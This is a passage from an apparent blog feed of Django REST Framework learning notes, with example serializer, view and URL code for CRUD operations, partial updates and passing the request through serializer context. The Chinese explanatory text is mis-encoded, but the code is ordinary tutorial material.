&#125;,</span><br><span class="line">            <span class="string">'img'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'author_list'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish_name'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="comment"># ä¹¦åä¸èƒ½åŒ…å« g å­—ç¬¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'è¯¥gä¹¦ä¸èƒ½å‡ºç‰ˆ'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)</span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="comment"># è§†é¢‘é‡Œä½¿ç”¨è¿™ç§éªŒè¯æ–¹å¼ï¼Œå®é™…æ˜¯ä¸åˆç†çš„ï¼Œå› ä¸ºä¼šå¯¼è‡´é’ˆå¯¹ä»·æ ¼ä¿®æ”¹çš„PUTè¯·æ±‚å¤±è´¥(name&amp;publishå·²å­˜åœ¨)</span></span><br><span class="line">        <span class="comment"># å› æ­¤åœ¨è¿™é‡Œå°†å…¶æ³¨é‡Šæ‰ ï¼Œæ­£ç¡®çš„æ–¹å¼æ˜¯åœ¨models.Bookä¸­å¯¹è¿™ä¸¤ä¸ªå­—æ®µçš„å…±åŒå”¯ä¸€æ€§ä½œçº¦æŸ</span></span><br><span class="line">        <span class="comment"># è€Œæœ¬å‡½æ•°é€šå¸¸ä½œä¸ºå¯¹ä¸åŒattrçš„å¯¹æ¯”éªŒè¯ï¼Œå¦‚ä¸¤æ¬¡è¾“å…¥å¯†ç æ˜¯å¦ä¸€è‡´ç­‰</span></span><br><span class="line">        <span class="comment"># if models.Book.objects.filter(name=name, publish=publish):</span></span><br><span class="line">        <span class="comment">#     raise ValidationError(&#123;'book': 'è¯¥ä¹¦å·²å­˜åœ¨'&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> attrs</span><br></pre></td></tr></table></figure></details><div class="note warning">            <h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><ol><li><code>fields</code>ä¸­è®¾ç½®æ‰€æœ‰åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å­—æ®µ</li><li><code>extra_kwargs</code>åˆ’åˆ†åªåºåˆ—åŒ–æˆ–åªååºåˆ—åŒ–å­—æ®µï¼ˆä¸€èˆ¬æˆ‘ä»¬æŠŠéœ€è¦å­˜å…¥åˆ°æ•°æ®åº“ä¸­çš„ä½¿ç”¨<code>write_only</code>ï¼ˆååºåˆ—åŒ–ï¼‰,åªéœ€è¦å±•ç¤ºçš„å°±read_only(åºåˆ—åŒ–)ï¼Œçœ‹éœ€æ±‚è®¾è®¡ï¼‰<ul><li><code>write_only</code>ï¼šåªååºåˆ—åŒ–</li><li><code>read_only</code>ï¼šåªåºåˆ—åŒ–</li><li>è‡ªå®šä¹‰å­—æ®µé»˜è®¤åªåºåˆ—åŒ–(<code>read_only</code>)</li><li>å¦‚æœå­—æ®µæ²¡è®¾ç½®<code>write_only</code>æˆ–è€…<code>read_only</code>ï¼Œé‚£ä¹ˆè¯¥å­—æ®µå¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–</li></ul></li><li>è®¾ç½®ååºåˆ—åŒ–æ‰€éœ€çš„ ç³»ç»Ÿã€å±€éƒ¨é’©å­ã€å…¨å±€é’©å­ ç­‰æ ¡éªŒè§„åˆ™</li></ol>          </div><h4 id="è§†å›¾å±‚-views-py-2"><a href="#è§†å›¾å±‚-views-py-2" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h4><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># å•æŸ¥</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'å‚æ•°æœ‰è¯¯'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># ç¾¤æŸ¥</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(is_delete=<span class="literal">False</span>).all()</span><br><span class="line">            book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># å•å¢:ä¼ çš„æ•°æ®æ˜¯ä¸modelå¯¹åº”çš„ä¸€ä¸ªå­—å…¸</span></span><br><span class="line">        <span class="comment"># ç¾¤å¢ï¼šè®¾è®¡ä¼ é€’çš„æ˜¯å¤šä¸ªmodelå¯¹åº”çš„å­—å…¸åˆ—è¡¨,åœ¨postmanä¸­é€šè¿‡åˆ—è¡¨åµŒå¥—å­—å…¸ä¼ å€¼</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="keyword">if</span> isinstance(request_data, dict):  <span class="comment"># åˆ¤æ–­è·å–çš„æ•°æ®æ˜¯å¦æ˜¯dict</span></span><br><span class="line">            many = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(request_data, list):  <span class="comment"># åˆ¤æ–­è·å–çš„æ•°æ®æ˜¯å¦æ˜¯list</span></span><br><span class="line">            many = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'æ•°æ®é”™è¯¯'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        book_ser = serializers.V2BookModelSerializer(</span><br><span class="line">            data=request_data, many=many)  <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># book_resultæ˜¯å¯¹è±¡&lt;class 'app01.models.Book'&gt;ï¼Œç¾¤å¢å°±æ˜¯åˆ—è¡¨å¥—ä¸€ä¸ªä¸ªå¯¹è±¡</span></span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.V2BookModelSerializer(book_result, many=many).data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å•åˆ : æœ‰pk   #åœ¨postmanä¸­é€šè¿‡è·¯å¾„ä¼ å‚</span></span><br><span class="line">    <span class="comment"># ç¾¤åˆ ï¼šæœ‰pks   &#123;"pks": [1, 2, 3]&#125;   #é€šè¿‡jsonä¼ å‚</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            pks = [pk]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pks = request.data.get(<span class="string">'pks'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(pk__in=pks, is_delete=<span class="literal">False</span>).update(is_delete=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'åˆ é™¤æˆåŠŸ'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'åˆ é™¤å¤±è´¥'</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></details><div class="note warning">            <h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><ol><li>åºåˆ—åŒ–æ•°æ®æœ€åå¿…é¡»è¦<code>.data</code> ï¼ˆå› ä¸ºè¦ä¼ ç»™å‰ç«¯ï¼‰</li><li>ååºåˆ—åŒ–é€šè¿‡<code>data</code>ä¼ å‚ï¼Œåºåˆ—åŒ–é€šè¿‡<code>instance</code>ä¼ å‚ï¼ˆå½“ä½ åªä¼ ä¸€ä¸ªå‚æ•°æ—¶ï¼Œé»˜è®¤æ˜¯<code>instance</code>çš„å‚æ•°ï¼‰</li><li>ååºåˆ—åŒ–ä¸åºåˆ—åŒ–éƒ½èƒ½ä½¿ç”¨<code>many=True</code>ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®åªè¦è¢«[]åµŒå¥—éƒ½è¦å†™<code>many=True</code></li></ol>          </div><h4 id="å­è·¯ç”±å±‚-api-urls-py-2"><a href="#å­è·¯ç”±å±‚-api-urls-py-2" class="headerlink" title="å­è·¯ç”±å±‚ api/urls.py"></a>å­è·¯ç”±å±‚ <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.V2Book.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.V2Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨åœºæ™¯æ€»ç»“"><a href="#ä½¿ç”¨åœºæ™¯æ€»ç»“" class="headerlink" title="ä½¿ç”¨åœºæ™¯æ€»ç»“"></a>ä½¿ç”¨åœºæ™¯æ€»ç»“</h1><p>åºåˆ—åŒ–ç±»åˆå§‹åŒ–æ—¶ï¼Œ<code>instance</code>/<code>data</code>/<code>many</code>/<code>partial</code> æ˜¯å½±å“åºåˆ—åŒ–å¯¹è±¡è¡Œä¸ºçš„å››ä¸ªå…³é”®å‚æ•°ã€‚</p><h2 id="åºåˆ—åŒ–è§’åº¦"><a href="#åºåˆ—åŒ–è§’åº¦" class="headerlink" title="åºåˆ—åŒ–è§’åº¦"></a>åºåˆ—åŒ–è§’åº¦</h2><h3 id="åºåˆ—åŒ–-1"><a href="#åºåˆ—åŒ–-1" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>å¦‚æœæ²¡æœ‰<code>data</code>å‚æ•°ï¼Œåªæœ‰<code>instance</code>ï¼Œé‚£ä¹ˆå°±ä¸å­˜åœ¨ååºåˆ—åŒ–æ ¡éªŒä¸€è¯´ï¼Œåªæœ‰åºåˆ—åŒ–å¯¹è±¡<code>instance</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åºåˆ—åŒ–get ï¼ˆç»™å‰ç«¯ä¼ é€’å‚æ•°ï¼‰  #æŸ¥è¯¢</span></span><br><span class="line">ser_obj = ModelSerializer(model_obj)   <span class="comment">#åªä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œé»˜è®¤æ˜¯instanceçš„å‚æ•°ï¼ŒæŸ¥è¯¢æ•°æ®</span></span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–-1"><a href="#ååºåˆ—åŒ–-1" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>å¦‚æœæœ‰<code>data</code>ï¼Œæ²¡æœ‰<code>instance</code>ï¼Œåˆ™éœ€è¦è°ƒç”¨<code>is_valid</code>æ–¹æ³•æ ¡éªŒ<code>data</code>ï¼Œç„¶åå°†<code>data</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°<code>validated_data</code>ï¼Œæ­¤æ—¶å†é€šè¿‡åºåˆ—åŒ–å¯¹è±¡è·å–<code>data</code>ï¼Œè¿™ä¸ª<code>data</code>å’Œåˆå§‹åŒ–æä¾›çš„<code>data</code>ä¸åŒï¼Œæ˜¯åºåˆ—åŒ–<code>validated_data</code>åçš„<code>data</code>ï¼Œæ¯”èµ·åˆå§‹åŒ–<code>data</code>ï¼Œå¯èƒ½å‡å°‘äº†æ— æ•ˆçš„å­—æ®µï¼ˆåºåˆ—åŒ–æ²¡æœ‰å®šä¹‰çš„å­—æ®µï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ååºåˆ—åŒ–post  save() =&gt; create()ï¼ˆæ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼‰  #æ·»åŠ </span></span><br><span class="line">ser_obj = ModelSerializer(data=model_data)  <span class="comment">#ä¼ é€’dataå‚æ•°ï¼Œä¿å­˜æ•°æ®</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ“ä½œè§’åº¦ï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰"><a href="#æ•°æ®æ“ä½œè§’åº¦ï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰" class="headerlink" title="æ•°æ®æ“ä½œè§’åº¦ï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰"></a>æ•°æ®æ“ä½œè§’åº¦ï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰</h3><h2 id="ä¿®æ”¹åœºæ™¯"><a href="#ä¿®æ”¹åœºæ™¯" class="headerlink" title="ä¿®æ”¹åœºæ™¯"></a>ä¿®æ”¹åœºæ™¯</h2><ul><li>å¦‚æœåŒæ—¶æä¾›äº†<code>instance</code>åŠ<code>data</code>, é‚£ä¹ˆåªè¦æœ‰<code>data</code>æˆ–è€…éƒ¨åˆ†<code>data</code>ï¼Œ<code>data</code>éƒ½è¦è¿›è¡ŒéªŒè¯æ‰èƒ½è¿›è¡Œä¸‹é¢çš„<code>save</code>ç­‰æ“ä½œï¼Œå¦‚æœä¸ç»è¿‡<code>is_valid</code>è¿‡ç¨‹ï¼Œé‚£ä¹ˆåé¢çš„è·å–åºåˆ—åŒ–æ•°æ®æˆ–è€…ååºåˆ—åŒ–æ•°æ®éƒ½ä¼šæ— æ•ˆã€‚</li><li>è¦ç”¨<code>instance</code>æŒ‡æ˜è¦ä¿®æ”¹çš„å¯¹è±¡<code>partial</code>ç”¨äºéƒ¨åˆ†æ›´æ–°ï¼Œä¹‹æ‰€ä»¥è¦ä¼´éš<code>instance</code>ï¼Œæ˜¯å› ä¸ºè¦æŒ‡æ˜ç»™<code>save</code>ç”¨ï¼Œåœ¨<code>save</code>æ“ä½œæ—¶ç»™é‚£ä¸ª<code>instance</code>éƒ¨åˆ†æ›´æ–°ã€‚é€»è¾‘è¿™å›èµ°åˆ°ä¸‹é¢æºç ä¸­çš„<code>get_initial()</code>è·å–è¦è¿›è¡Œæ›´æ–°<code>instance</code>çš„å­—æ®µæ•°æ®ã€‚</li></ul><h3 id="å•æ”¹"><a href="#å•æ”¹" class="headerlink" title="å•æ”¹"></a>å•æ”¹</h3><ol><li>å•æ•´ä½“æ”¹ï¼Œè¯´æ˜å‰å°è¦æä¾›ä¿®æ”¹çš„æ•°æ®ï¼Œä¿®æ”¹ä¹‹åä¿å­˜çš„æ•°æ®éœ€è¦æ ¡éªŒï¼Œæ ¡éªŒçš„æ•°æ®åº”è¯¥åœ¨å®ä¾‹åŒ–â€œåºåˆ—åŒ–ç±»å¯¹è±¡â€æ—¶ï¼Œèµ‹å€¼ç»™<code>data</code></li><li>ä¿®æ”¹ï¼Œå°±å¿…é¡»æ˜ç¡®è¢«ä¿®æ”¹çš„æ¨¡å‹ç±»å¯¹è±¡ï¼Œå¹¶åœ¨å®ä¾‹åŒ–â€œåºåˆ—åŒ–ç±»å¯¹è±¡â€æ—¶ï¼Œèµ‹å€¼ç»™<code>instance</code>ï¼Œå¿…é¡»èµ‹å€¼ç»™<code>instance</code></li><li>æ•´ä½“ä¿®æ”¹ï¼Œæ‰€æœ‰æ ¡éªŒè§„åˆ™æœ‰<code>required=True</code>çš„å­—æ®µï¼Œéƒ½å¿…é¡»æä¾›ï¼Œå› ä¸ºåœ¨å®ä¾‹åŒ–â€œåºåˆ—åŒ–ç±»å¯¹è±¡â€æ—¶ï¼Œå‚æ•°<code>partial</code>é»˜è®¤ä¸º<code>False</code></li></ol><h4 id="æ•´ä½“æ”¹-PUT"><a href="#æ•´ä½“æ”¹-PUT" class="headerlink" title="æ•´ä½“æ”¹(PUT)"></a>æ•´ä½“æ”¹(<code>PUT</code>)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># è¦è¢«æ›´æ–°çš„å¯¹è±¡</span></span><br><span class="line">    data=model_data, <span class="comment"># ç”¨æ¥æ›´æ–°çš„æ•°æ®</span></span><br><span class="line">    partial=<span class="literal">False</span>, <span class="comment"># é»˜è®¤Falseï¼Œå¿…é¡»çš„å­—æ®µå…¨éƒ¨å‚ä¸æ ¡éªŒ</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="å±€éƒ¨æ”¹-PATCH"><a href="#å±€éƒ¨æ”¹-PATCH" class="headerlink" title="å±€éƒ¨æ”¹(PATCH)"></a>å±€éƒ¨æ”¹(<code>PATCH</code>)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># è¦è¢«æ›´æ–°çš„å¯¹è±¡, </span></span><br><span class="line">    data=model_data, <span class="comment"># ç”¨æ¥æ›´æ–°çš„æ•°æ®,</span></span><br><span class="line">    partial=<span class="literal">True</span>, <span class="comment"># è®¾ç½®Trueï¼Œå¿…é¡»çš„å­—æ®µéƒ½å˜ä¸ºé€‰å¡«å­—æ®µ</span></span><br><span class="line">)</span><br><span class="line">    <span class="comment"># æ³¨ï¼špartialè®¾ç½®Trueçš„æœ¬è´¨å°±æ˜¯ä½¿å­—æ®µ required=True æ ¡éªŒè§„åˆ™å¤±æ•ˆ</span></span><br></pre></td></tr></table></figure><h2 id="ç¾¤æ”¹-ListSerializer"><a href="#ç¾¤æ”¹-ListSerializer" class="headerlink" title="ç¾¤æ”¹ ListSerializer"></a>ç¾¤æ”¹ <code>ListSerializer</code></h2><p><code>many</code>å‚æ•°å°†ç›´æ¥å½±å“åºåˆ—åŒ–ç±»çš„ç±»å‹ï¼Œå¦‚æœæ˜¯<code>many=False</code>ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨å½“å‰åºåˆ—åŒ–ç±»ã€‚å¦‚æœ<code>many=True</code>ï¼Œå°†å®ä¾‹åŒ–ä¸€ä¸ª<code>ListSerializer</code>ç±»æ¥åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ç±»ã€‚</p><p>åœ¨å‰é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åœ¨<code>V2BookModelSerializer</code>ç±»ä¸­å¹¶æ²¡æœ‰åšå¯¹å¤šå¯¹è±¡åºåˆ—åŒ–çš„ç‰¹æ®Šå¤„ç†ï¼Œä½†V2ç‰ˆæœ¬çš„apiä»ç„¶æ”¯æŒç¾¤å¢å’Œç¾¤åˆ æ“ä½œã€‚ç©¶å…¶åŸå› ï¼Œæ˜¯ç”±äº<code>BaseSerializer.__new__</code>æ–¹æ³•ï¼‰æˆ–è€…<code>class Meta:</code>ä¸­å®šä¹‰äº†<code>list_serializer_class</code>æŒ‡å®šçš„å¤šå¯¹è±¡åºåˆ—åŒ–ç±»ã€‚</p><p>å…³äº <code>ListSerializer</code>çš„è¯¦ç»†ä»‹ç»è¯·çœ‹ä¸‹ä¸€ç¯‡ã€‚</p><h1 id="ç»™åºåˆ—åŒ–ç±»ä¼ å…¥è‡ªå®šä¹‰æ•°æ®"><a href="#ç»™åºåˆ—åŒ–ç±»ä¼ å…¥è‡ªå®šä¹‰æ•°æ®" class="headerlink" title="ç»™åºåˆ—åŒ–ç±»ä¼ å…¥è‡ªå®šä¹‰æ•°æ®"></a>ç»™åºåˆ—åŒ–ç±»ä¼ å…¥è‡ªå®šä¹‰æ•°æ®</h1><p>è§†å›¾ç±»<code>views.py</code>ä½¿ç”¨<code>context</code>ä¼ é€’å‚æ•°ç»™åºåˆ—åŒ–ç±»<code>serializers.py</code></p><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><ol><li>åœ¨è§†å›¾ç±»ä¸­å®ä¾‹åŒ–åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¯ä»¥è®¾ç½®<code>context</code>å†…å®¹</li><li>åœ¨åºåˆ—åŒ–ç±»ä¸­çš„<code>å±€éƒ¨é’©å­</code>ã€<code>å…¨å±€é’©å­</code>ã€<code>create</code>ã€<code>update</code>æ–¹æ³•ä¸­ï¼Œéƒ½å¯ä»¥ç”¨<code>self.context</code>è®¿é—®è§†å›¾ç±»ä¼ é€’è¿‡æ¥çš„å†…å®¹ã€‚</li></ol><h2 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h2><p>ä¾‹å¦‚æœ‰ç±»ä¼¼å¦‚ä¸‹éœ€æ±‚æ—¶ï¼š</p><ul><li>åœ¨è§†å›¾ç±»<code>views</code>ä¸­ï¼Œå¯ä»¥é€šè¿‡<code>request</code>å¾—åˆ°ç™»é™†ç”¨æˆ·<code>request.user</code></li><li>åœ¨åºåˆ—åŒ–ç±»ä¸­ï¼Œè¦å®Œæˆæ•°æ®åº“æ•°æ®çš„æ ¡éªŒä¸å…¥åº“æ“ä½œï¼Œå¯èƒ½ä¼šéœ€è¦çŸ¥é“å½“å‰çš„ç™»é™†ç”¨æˆ·ï¼Œä½†åºåˆ—åŒ–ç±»é»˜è®¤æ— æ³•è®¿é—®<code>request</code></li></ul><p>å› æ­¤åœ¨è§†å›¾ç±»ä¸­å®ä¾‹åŒ–åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå°†<code>request</code>å¯¹è±¡ä¼ é€’è¿›å»</p><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="è§†å›¾å±‚-views-py-3"><a href="#è§†å›¾å±‚-views-py-3" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_ser = serializers.BookModelSerializer(data=request_data,context=&#123;<span class="string">'request'</span>:request&#125;)   <span class="comment">#è§†å›¾å±‚contextä¼ é€’å‚æ•°</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_result).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–å±‚-serializers-py"><a href="#åºåˆ—åŒ–å±‚-serializers-py" class="headerlink" title="åºåˆ—åŒ–å±‚ serializers.py"></a>åºåˆ—åŒ–å±‚ <code>serializers.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(self.context.get(<span class="string">'request'</span>).method)  <span class="comment">#åºåˆ—åŒ–å±‚æ¥æ”¶å‚æ•°</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><h1 id="æ‰©å±•é˜…è¯»"><a href="#æ‰©å±•é˜…è¯»" class="headerlink" title="æ‰©å±•é˜…è¯»"></a>æ‰©å±•é˜…è¯»</h1><p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTY4OTM0NTUxODgyNTczNDQzY2RkZjg=">django rest framework serializerså°ç»“<i class="fa fa-external-link-alt"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
